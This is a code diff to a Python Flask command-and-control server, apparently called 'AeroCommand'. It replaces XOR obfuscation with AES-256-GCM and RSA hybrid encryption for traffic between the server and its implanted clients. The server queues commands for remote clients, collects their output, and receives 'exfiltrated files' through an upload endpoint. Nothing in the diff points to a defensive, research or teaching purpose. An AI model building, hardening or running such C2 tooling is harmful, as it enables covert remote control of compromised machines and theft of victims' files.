@@ -94,36 +94,93 @@ results = []
 cmd_lock = threading.Lock()
 target_client = None
 
-# === XOR Encryption (must match client key) ===
-XOR_KEY = 0x5A
+# === AES-256 + RSA Hybrid Encryption ===
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
+from Crypto.Random import get_random_bytes
 
-def xor_encrypt(data: str) -> str:
-    """XOR encrypt a string and return base64 encoded result"""
-    encrypted = bytes([b ^ XOR_KEY for b in data.encode('utf-8', errors='replace')])
-    return base64.b64encode(encrypted).decode()
+# Generate or load server RSA key pair
+RSA_KEY_FILE = "server_rsa.pem"
+if os.path.exists(RSA_KEY_FILE):
+    with open(RSA_KEY_FILE, "rb") as f:
+        server_rsa_key = RSA.import_key(f.read())
+else:
+    server_rsa_key = RSA.generate(2048)
+    with open(RSA_KEY_FILE, "wb") as f:
+        f.write(server_rsa_key.export_key())
 
-def xor_decrypt(data: str) -> str:
-    """Decode base64 and XOR decrypt back to string"""
-    raw = base64.b64decode(data)
-    decrypted = bytes([b ^ XOR_KEY for b in raw])
-    return decrypted.decode('utf-8', errors='replace')
+server_rsa_public = server_rsa_key.publickey().export_key().decode()
 
-def decrypt_payload():
-    """Decrypt incoming XOR-encrypted request body to dict"""
+# Client session keys mapping: client_id -> 32-byte AES key
+client_sessions = {}
+session_lock = threading.Lock()
+
+def encrypt_aes(data: str, aes_key: bytes) -> str:
+    """Encrypt string with AES-256-GCM and return base64 encoded payload (nonce + tag + ciphertext)"""
+    cipher = AES.new(aes_key, AES.MODE_GCM)
+    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
+    payload = cipher.nonce + tag + ciphertext
+    return base64.b64encode(payload).decode()
+
+def decrypt_aes(raw_b64: str, aes_key: bytes) -> str:
+    """Decrypt base64 encoded AES-256-GCM payload"""
+    raw = base64.b64decode(raw_b64)
+    nonce = raw[:16]
+    tag = raw[16:32]
+    ciphertext = raw[32:]
+    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+    return decrypted.decode('utf-8')
+
+def decrypt_payload(client_id=None):
+    """Decrypt incoming AES-encrypted request body using client's session key"""
     raw = request.get_data(as_text=True)
-    try:
-        decrypted = xor_decrypt(raw)
-        return json.loads(decrypted)
-    except Exception:
-        # Fallback: try plain JSON (backwards compatibility / debugging)
+    if not raw:
+        return {}
+    
+    # If client_id is known and has an active AES session key
+    aes_key = None
+    if client_id and client_id in client_sessions:
+        aes_key = client_sessions[client_id]
+    
+    if aes_key:
         try:
-            return request.get_json(force=True)
-        except Exception:
-            return {}
+            decrypted = decrypt_aes(raw, aes_key)
+            return json.loads(decrypted)
+        except Exception as e:
+            pass
+            
+    # Fallback for registration or handshake where payload includes encrypted session key
+    try:
+        data = json.loads(raw)
+        if "encrypted_session_key" in data and "payload" in data:
+            # Decrypt AES session key with Server's RSA private key
+            rsa_cipher = PKCS1_OAEP.new(server_rsa_key)
+            enc_session_key = base64.b64decode(data["encrypted_session_key"])
+            aes_key = rsa_cipher.decrypt(enc_session_key)
+            
+            # Register session key if client_id is provided in inner or outer payload
+            inner_payload = json.loads(decrypt_aes(data["payload"], aes_key))
+            cid = inner_payload.get("client_id")
+            if cid:
+                with session_lock:
+                    client_sessions[cid] = aes_key
+            return inner_payload
+    except Exception:
+        pass
 
-def encrypt_response(data):
-    """Encrypt outgoing response dict to XOR-encoded string"""
-    return xor_encrypt(json.dumps(data))
+    # Final fallback: plain JSON for legacy clients
+    try:
+        return request.get_json(force=True)
+    except Exception:
+        return {}
+
+def encrypt_response(data, client_id=None):
+    """Encrypt outgoing response dict using client's AES session key or fallback to JSON"""
+    json_str = json.dumps(data)
+    if client_id and client_id in client_sessions:
+        return encrypt_aes(json_str, client_sessions[client_id])
+    return json_str
 
 # === ANSI Colors ===
 class C:
@@ -148,6 +205,11 @@ PROMPT = f"{C.RED}⚡ AeroCommand > {C.RESET}"
 @app.route("/test", methods=["GET"])
 def test():
     return "SERVER RUNNING OK", 200
+
+@app.route("/rsa_pub", methods=["GET"])
+def get_rsa_pub():
+    """Provide server RSA public key for client hybrid encryption handshake"""
+    return server_rsa_public, 200
 
 
 @app.route("/register", methods=["POST"])
@@ -216,14 +278,24 @@ def get_command():
             cmd = pending_commands[client_id].pop(0)
             if not pending_commands[client_id]:
                 del pending_commands[client_id]
-            return encrypt_response({"command": cmd}), 200
+            return encrypt_response({"command": cmd}, client_id=client_id), 200
 
         return "", 200
 
 
 @app.route("/result", methods=["POST"])
 def post_result():
-    data = decrypt_payload()
+    # Pre-parse client_id from raw JSON if possible, or pass None
+    raw_peek = request.get_data(as_text=True)
+    cid_peek = None
+    try:
+        # Check if it's already decrypted or we can extract client_id
+        parsed_peek = json.loads(raw_peek)
+        if isinstance(parsed_peek, dict):
+            cid_peek = parsed_peek.get("client_id")
+    except Exception:
+        pass
+    data = decrypt_payload(client_id=cid_peek)
     output = data.get('output', '')
     client_id = data.get('client_id', request.remote_addr)
     timestamp = datetime.now().strftime("%H:%M:%S")
@@ -246,7 +318,15 @@ def post_result():
 @app.route("/upload", methods=["POST"])
 def upload_file():
     """Receive exfiltrated files from clients"""
-    data = decrypt_payload()
+    raw_peek = request.get_data(as_text=True)
+    cid_peek = None
+    try:
+        parsed_peek = json.loads(raw_peek)
+        if isinstance(parsed_peek, dict):
+            cid_peek = parsed_peek.get("client_id")
+    except Exception:
+        pass
+    data = decrypt_payload(client_id=cid_peek)
     filename = data.get("name", "unknown")
     file_data = base64.b64decode(data.get("file", ""))
     client_id = data.get("client_id", request.remote_addr)
